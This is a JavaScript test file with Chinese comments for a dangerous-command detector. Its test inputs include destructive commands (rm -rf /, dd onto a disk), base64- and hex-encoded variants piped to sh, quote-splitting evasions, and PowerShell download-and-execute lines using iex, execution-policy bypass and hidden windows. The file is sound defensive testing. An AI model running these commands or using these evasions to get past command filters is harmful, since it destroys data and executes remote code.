// 17 个回归：危险命令的编码/变形绕过 + pwsh 规则（1.3.49 #7）。
import test from 'node:test'
import assert from 'node:assert/strict'
import { isDangerousCommand, decodeVariants } from '../src/security/danger.js'

test('明文危险命令照旧拦截（原有规则未松动）', () => {
  assert.ok(isDangerousCommand('rm -rf /'))
  assert.ok(isDangerousCommand('shutdown /s /t 0'))
  assert.ok(isDangerousCommand('dd if=/dev/zero of=/dev/sda'))
  assert.equal(isDangerousCommand('ls -la /tmp'), null)
  assert.equal(isDangerousCommand('git push origin main'), null)
})

test('base64/hex 管道执行被新规则拦下', () => {
  assert.match(isDangerousCommand('echo cm0gLXJmIC8= | base64 -d | sh').label, /解码后执行/)
  assert.match(isDangerousCommand('echo 726d202d7266202f | xxd -r -p | sh').label, /xxd|printf/)
  assert.equal(isDangerousCommand('echo aGVsbG8= | base64 -d'), null, '解码但不执行：放行')
})

test('解码探测：反斜杠/空引号拆词还原后命中原规则', () => {
  assert.ok(isDangerousCommand('\\rm -rf /'), '反斜杠插空')
  assert.ok(isDangerousCommand('r' + "''" + 'm -rf /'), '空引号拆词')
  assert.ok(isDangerousCommand('r""m -rf /'), '双引号变体')
  assert.equal(decodeVariants('\\rm -rf /').length > 0, true)
})

test('pwsh 高频绕过：iex 本体 / -ep bypass / 隐藏窗口', () => {
  assert.match(isDangerousCommand('$d = iwr https://x/a.ps1; iex $d').label, /pwsh 直接执行/)
  assert.match(isDangerousCommand('powershell -ep bypass -c iex($d)').label, /绕过执行策略|pwsh 直接执行/)
  // -w hidden 命中「直接执行下载内容」（命令里有 iex）和「隐藏窗口」两条，取哪条都算拦
  const hidden = isDangerousCommand('powershell -w hidden -c iex($x)')
  assert.ok(hidden && /隐藏窗口|pwsh 直接执行/.test(hidden.label), JSON.stringify(hidden))
  assert.equal(isDangerousCommand('Get-ChildItem -Recurse C:/projects'), null, '正常 pwsh 不拦')
})

test('时钟回拨不误伤：正常运维命令零误报', () => {
  for (const cmd of ['npm install', 'git push origin main', 'docker compose up -d', 'curl https://api.example.com']) {
    assert.equal(isDangerousCommand(cmd), null, cmd)
  }
})
